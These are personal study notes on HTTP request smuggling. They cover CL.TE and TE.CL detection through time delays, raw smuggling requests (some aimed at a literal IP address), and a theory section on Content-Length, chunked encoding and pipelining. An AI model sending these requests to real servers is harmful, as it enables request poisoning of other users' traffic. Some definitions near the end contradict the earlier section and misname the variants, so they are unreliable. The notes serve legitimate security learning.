## https request smuggle  
### How to find
- If request is being delayed then it could have been smuggled
- ref: https://portswigger.net/web-security/request-smuggling/finding
#### CL.TE
- Check if `CL.TE` is present ![CL.TE Differntial response](../images/content-smuggle/CL.TE.png)
- 
    ```
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 4
    Connection: keep-alive

    1
    A
    X
    ```
- Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. The back-end server uses the Transfer-Encoding header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay. 
- The below is for utilising the smuggle to add header.
    ```
    POST / HTTP/1.1
    HOST: 89.207.132.170
    Connection: keep-alive
    Content-Length: 6
    Content-Type: application/x-www-form-urlencoded
    Transfer-Encoding: chunked
    \r\n
    0\r\n\
    \r\n\
    X-Ignore: X
    ```
  - remove extra `\r\n\` which is due to copy paste
  - Fist disable the update header content length to check if this is succeptilbe and then enable it to smuggle the request
  - Mind that there is no `\r\n\` after `X-Ignore: X` because next get request will be in new line if added

#### TE.CT
- timeout happens if `TE.CT` is present
    ```
    POST / HTTP/1.1
    HOST: 89.207.132.170
    Connection: keep-alive
    Content-Length: 60
    Content-Type: application/x-www-form-urlencoded
    Transfer-Encoding: chunked
    \r\n
    0\r\n\
    \r\n\
    X-Ignore: X
    ```

- Differential attack method
  - Attach request (contains posioning payload)
  - Normal request (normal request)


### Theory
  - Always done in POST request not GET request
  - works in http1.1 ( does not close connection with every request, but if you want to close it then connection: close)
    - http pipeline which is stack queue of request
  - clrf \r\n`` means new line
  - `Content-Length`: length of context body in first line and then next line gives the content length of the next line
    e.g. 
    ```
    
    GET / HTTP/1.1
    Content-Length: 7
    \r\n
    apple\r\n\
    ```
  - `Transfer-Encoding: chunked`: it looks for `\r\n\` to know the end of the content body
    e.g. 
    ```
    GET / HTTP/1.1 \r\n\
    Transfer-Encoding: chunked\r\n\
    \r\n\
    1\r\n\
    a\r\n\
    6\r\n\
    hello\r\n\
    2\r\n\
    hi\r\n\
    \r\n\
    ```
  - what if both are given `Content-Length` and `Transfer-Encoding` then `Content-Length` will be ignored in http1.1
  - We have Frontend server(e.g. loadbalancer: ngrok) and Backend server(e.g. service). If multiple requests are done then all of them is joined in a single TCP connection using http pipelining.
    - ![step1](../images/content-smuggle/smuggle-0.png)
    - ![step2](../images/content-smuggle/smuggle-1.png)
    - ![step3](../images/content-smuggle/smuggle-2.png)
  - Poisoned `CL.TE` means if both are present then CL will be ignored 
  - Similarly `TE.CT` means if both are present then TE will be ignored
  - Similary `TE.TE` means if both are present then TE will be checked


